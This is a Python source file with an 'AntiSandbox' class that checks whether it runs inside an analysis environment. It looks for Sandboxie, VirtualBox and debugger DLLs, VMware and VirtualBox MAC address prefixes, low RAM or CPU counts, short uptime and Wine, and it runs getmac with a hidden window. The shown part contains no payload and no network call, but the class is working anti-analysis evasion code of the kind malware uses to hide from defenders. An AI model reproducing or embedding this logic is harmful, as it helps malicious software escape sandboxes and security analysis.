import ctypes, psutil, subprocess, os, time, re

class AntiSandbox:
    DLL_INDICATORS = [
        "SbieDll.dll", "VBoxHook.dll", "VBoxSF.dll", "VBoxDisp.dll",
        "vmcheck.dll", "wpespy.dll", "snxhk.dll", "dbghelp.dll", "dbgcore.dll"
    ]

    VM_MAC_PREFIXES = [
        "00:05:69",  # VMware
        "00:0C:29",
        "00:1C:14",
        "00:50:56",
        "08:00:27",  # VirtualBox
    ]

    @staticmethod
    def detect_dlls() -> bool:
        GetModuleHandle = ctypes.windll.kernel32.GetModuleHandleA
        for dll in AntiSandbox.DLL_INDICATORS:
            if GetModuleHandle(dll.encode()) != 0:
                return True
        return False

    @staticmethod
    def detect_mac() -> bool:
        try:
            output = subprocess.check_output("getmac", creationflags=0x08000000)
            output = output.decode(errors="ignore")

            macs = re.findall(r"([0-9A-F]{2}(?:-[0-9A-F]{2}){5})", output, re.I)
            macs = [mac.replace("-", ":").lower() for mac in macs]

            for mac in macs:
                if any(mac.startswith(prefix.lower()) for prefix in AntiSandbox.VM_MAC_PREFIXES):
                    return True
        except:
            pass
        return False

    @staticmethod
    def detect_hardware() -> bool:
        try:
            class MEMORYSTATUS(ctypes.Structure):
                _fields_ = [
                    ('dwLength', ctypes.c_ulong),
                    ('dwMemoryLoad', ctypes.c_ulong),
                    ('ullTotalPhys', ctypes.c_ulonglong),
                    ('ullAvailPhys', ctypes.c_ulonglong),
                    ('ullTotalPageFile', ctypes.c_ulonglong),
                    ('ullAvailPageFile', ctypes.c_ulonglong),
                    ('ullTotalVirtual', ctypes.c_ulonglong),
                    ('ullAvailVirtual', ctypes.c_ulonglong),
                    ('sullAvailExtendedVirtual', ctypes.c_ulonglong),
                ]

            mem = MEMORYSTATUS()
            mem.dwLength = ctypes.sizeof(mem)
            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))

            ram_gb = mem.ullTotalPhys / (1024**3)

            cpu_count = os.cpu_count()

            return ram_gb < 3 or cpu_count <= 2

        except:
            return False

    @staticmethod
    def detect_boot_time() -> bool:
        try:
            uptime = time.time() - psutil.boot_time()
            return uptime < 60
        except:
            return False

    @staticmethod
    def detect_wine() -> bool:
        return os.path.exists("C:\\windows\\system32\\wineboot.exe")